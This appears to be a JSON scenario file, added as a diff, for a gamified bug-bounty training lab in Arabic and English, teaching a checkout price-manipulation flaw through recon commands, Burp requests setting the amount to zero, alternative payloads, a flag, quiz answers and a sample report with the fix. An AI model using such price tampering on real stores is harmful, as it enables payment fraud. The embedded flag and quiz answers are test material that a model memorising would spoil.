@@ -1,0 +1,207 @@
+{
+  "metadata": {
+    "id": "scenario-006",
+    "title": "Business Logic - Price Manipulation in Checkout",
+    "level": "Easy",
+    "category": "Business Logic",
+    "company": "Uber",
+    "reward": "$2,000",
+    "time": "1 Hour"
+  },
+  "decisionLog": [
+    {
+      "hypothesis": "الخادم يربط أسعار المنتجات في قاعدة البيانات ولا يعتمد على قيمة الواجهة الأمامية.",
+      "whyFailed": "الخادم يثق تماماً بقيمة معامل السعر amount الممرر في الطلب من العميل ويستخدمه لإنشاء جلسة الدفع.",
+      "planB": "تعديل قيمة السعر amount إلى 0 أو قيمة سالبة لشراء الكورسات مجاناً.",
+      "ignored": "محاولة كسر لوحة المشرف."
+    }
+  ],
+  "payloads": [
+    {
+      "code": "POST /api/v2/initiate_payment HTTP/1.1\n{\n  \"product_id\": 123,\n  \"amount\": 0,\n  \"currency\": \"USD\"\n}",
+      "explanation": "إرسال قيمة السعر 0 مباشرة في جسم الطلب لتخطي دفع قيمة الكورس.",
+      "whyWorked": "الـ Backend لا يطابق السعر الممرر مع قاعدة البيانات ويقبل القيمة الممررة لبدء جلسة الدفع.",
+      "alternatives": [
+        "Negative price (-100)",
+        "Currency confusion JPY"
+      ]
+    }
+  ],
+  "mistakes": [
+    {
+      "mistake": "إكمال عملية الدفع ببطاقة حقيقية بعد التعديل.",
+      "whyWrong": "هذا تصرف غير أخلاقي ويعد انتهاكاً لاتفاقية الـ Bug Bounty.",
+      "betterWay": "التوقف فوراً عند ظهور رابط الدفع بالقيمة المعدلة وإرفاق لقطة شاشة كإثبات تأثير."
+    }
+  ],
+  "steps": [
+    {
+      "name": "Mission Brief",
+      "time": "09:00",
+      "workspace": "markdown",
+      "xpReward": 100,
+      "description": "### 🎯 الهدف: فحص بوابة دفع المنتجات الرقمية\n\nمرحباً بك! معنا اليوم متجر لبيع الكورسات الرقمية بسعر $1,049.\nعند الضغط على \"شراء\"، يتم إرسال طلب لتهيئة عملية الدفع.\n\n#### قواعد الفحص:\n- نطاق العمل: بوابة الدفع `/api/v2/initiate_payment`\n- تحقق من وجود أخطاء في منطق العمل (Business Logic) تسمح بالتلاعب بالسعر.\n\nاضغط على **Next Step** للبدء.",
+      "aiAdvisor": {
+        "hint": "ادرس الطلبات المارة عند الضغط على شراء.",
+        "payloadExplanation": "لا توجد أكواد مطلوبة حالياً.",
+        "failureExplanation": "لا يوجد."
+      }
+    },
+    {
+      "name": "Passive Recon",
+      "time": "09:15",
+      "workspace": "recon",
+      "xpReward": 150,
+      "description": "### 🔍 فحص هيكلية طلبات الدفع\n\nسنقوم بالتحقق من صحة الخيارات المتاحة للمسار.\nاختر الأداة المناسبة لتشغيلها.",
+      "terminalCommands": [
+        {
+          "name": "curl -I https://shop.target.com/checkout",
+          "correct": false,
+          "output": [
+            {
+              "text": "HTTP/1.1 200 OK",
+              "type": "info"
+            },
+            {
+              "text": "Server: nginx",
+              "type": "out"
+            }
+          ]
+        },
+        {
+          "name": "ffuf -u https://shop.target.com/api/v2/initiate_payment -X POST -d '{\"product_id\": 123}'",
+          "correct": true,
+          "evidence": {
+            "title": "Checkout API Parameters",
+            "content": "POST Parameters: product_id, amount, currency, user_id"
+          },
+          "output": [
+            {
+              "text": "Status: 400 Bad Request",
+              "type": "info"
+            },
+            {
+              "text": "Response: Missing required parameters: amount, currency",
+              "type": "success"
+            },
+            {
+              "text": "[!] Success: Checkout parameters leaked in error message!",
+              "type": "success"
+            }
+          ]
+        }
+      ],
+      "aiAdvisor": {
+        "hint": "شغّل ffuf للتحقق من البارامترات المطلوبة لواجهة الدفع البرمجية.",
+        "payloadExplanation": "ffuf تساعد في استكشاف وعمل فحص للمدخلات والمخرجات.",
+        "failureExplanation": "الفشل في معرفة البارامترات يجعلك ترسل طلبات غير مكتملة."
+      }
+    },
+    {
+      "name": "Burp Verification",
+      "time": "09:40",
+      "workspace": "burp",
+      "xpReward": 200,
+      "description": "### 🌐 اعتراض وتعديل طلب الدفع\n\nسنقوم بتعديل قيمة الـ `amount` من 1049 إلى 0 أو تجربة عملة الـ JPY المخفضة.\nاضغط على **Manipulate Price** لمشاهدة الرد.",
+      "burpRequest": "POST /api/v2/initiate_payment HTTP/1.1\nHost: shop.target.com\nContent-Type: application/json\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIs...\n\n{\n  \"product_id\": 123,\n  \"amount\": 1049,\n  \"currency\": \"USD\",\n  \"user_id\": 1337\n}",
+      "burpResponse": "HTTP/1.1 200 OK\n{\n  \"status\": \"success\",\n  \"payment_url\": \"https://payment-gateway.com/checkout?session=abc123\",\n  \"amount\": 1049\n}",
+      "burpActions": [
+        {
+          "name": "Manipulate Price",
+          "correct": true,
+          "modifiedRequest": "POST /api/v2/initiate_payment HTTP/1.1\nHost: shop.target.com\nContent-Type: application/json\n\n{\n  \"product_id\": 123,\n  \"amount\": 0,\n  \"currency\": \"USD\",\n  \"user_id\": 1337\n}",
+          "modifiedResponse": "HTTP/1.1 200 OK\n{\n  \"status\": \"success\",\n  \"payment_url\": \"https://payment-gateway.com/checkout?session=def456\",\n  \"amount\": 0,\n  \"currency\": \"USD\"\n}",
+          "evidence": {
+            "title": "Price Tampered to $0",
+            "content": "POST /api/v2/initiate_payment amount: 0 -> Returned success session with $0"
+          }
+        }
+      ],
+      "aiAdvisor": {
+        "hint": "اضغط على زر Manipulate Price لتعديل السعر إلى 0 وتأكيد إمكانية الشراء المجاني.",
+        "payloadExplanation": "تعديل قيمة المعامل المرسل للخادم مباشرة لتخطي فحص الثمن.",
+        "failureExplanation": "تأكد من تمرير القيمة صفر بنجاح."
+      }
+    },
+    {
+      "name": "Exploitation & Flag",
+      "time": "10:05",
+      "workspace": "lab",
+      "xpReward": 300,
+      "instructions": "أدخل الـ Flag المكتشف بعد تأكيد جلسة الدفع المجانية بنجاح.",
+      "targetUrl": "https://shop.target.com/api/v2/initiate_payment",
+      "correctFlag": "FLAG{price_manipulation_free_purchase}",
+      "aiAdvisor": {
+        "hint": "أدخل العلم الصحيح: FLAG{price_manipulation_free_purchase}",
+        "payloadExplanation": "تأكيد إكمال عملية التلاعب بنجاح.",
+        "failureExplanation": "تأكد من كتابة العلم بشكل صحيح."
+      }
+    },
+    {
+      "name": "Report Writing",
+      "time": "10:30",
+      "workspace": "report",
+      "xpReward": 250,
+      "aiAdvisor": {
+        "hint": "الكلمات المفتاحية المطلوبة هي 'price' و 'checkout'.",
+        "payloadExplanation": "شرح خطورة ثقة الخادم بمدخلات العميل في عمليات الدفع.",
+        "failureExplanation": "يجب وضع الكلمات المفتاحية بالتقرير للتقييم الصحيح."
+      }
+    },
+    {
+      "name": "Triage & Verdict",
+      "time": "5 Days Later",
+      "workspace": "review",
+      "aiAdvisor": {
+        "hint": "انظر Verdict وقبول الثغرة.",
+        "payloadExplanation": "تم تقييم الثغرة كـ High نظراً للخسائر المالية المباشرة.",
+        "failureExplanation": "لا يوجد."
+      }
+    },
+    {
+      "name": "Lessons Learned",
+      "time": "Post-Incident",
+      "workspace": "quiz",
+      "quizData": [
+        {
+          "question": "ما هو الخطأ الرئيسي للمطور في هذا السيناريو؟",
+          "options": [
+            "عدم استخدام جدار حماية.",
+            "الثقة ببيانات السعر المرسلة من جهة العميل (Frontend) دون التحقق منها ومقارنتها بقاعدة البيانات في الخلفية (Backend).",
+            "استخدام عملات دولية.",
+            "حظر استخدام المتصفحات."
+          ],
+          "answer": 1
+        },
+        {
+          "question": "كيف يتم إصلاح ثغرات التلاعب بالأسعار نهائياً؟",
+          "options": [
+            "تشفير السعر بالكامل.",
+            "توليد السعر والتحقق منه بالكامل في الخلفية (Server-Side) بناءً على معرف المنتج الثابت ومطابقته بقاعدة البيانات قبل إرساله لبوابة الدفع.",
+            "تعطيل خيار الدفع بالعملات الأخرى.",
+            "حظر التعديل في الواجهة الأمامية فقط."
+          ],
+          "answer": 1
+        }
+      ],
+      "aiAdvisor": {
+        "hint": "الإجابة لكلا السؤالين هي الخيار الثاني (ب).",
+        "payloadExplanation": "مراجعة قواعد أمان منطق العمليات التجارية الحساسة.",
+        "failureExplanation": "خطأ في الإجابة يؤدي لخصم XP."
+      }
+    }
+  ],
+  "realReport": {
+    "title": "Business Logic price manipulation on checkout api endpoint allows free purchases",
+    "severity": "High",
+    "type": "MassAssignment",
+    "desc": "The initiate_payment endpoint accepts the amount parameter directly from the client side and processes it without server-side database validation. This allows creating $0 order payment sessions.",
+    "steps": "1. Select a product and click checkout.\n2. Modify the POST body parameter amount to 0.\n3. The backend generates a checkout session with 0 USD.",
+    "impact": "Direct financial theft and unauthorized subscription upgrades.",
+    "feedback": "Confirmed. We patched the logic by fetching the official product price directly from the database prior to calling the payment gateway. Bounty awarded.",
+    "keywords": [
+      "price",
+      "checkout"
+    ]
+  }
+}
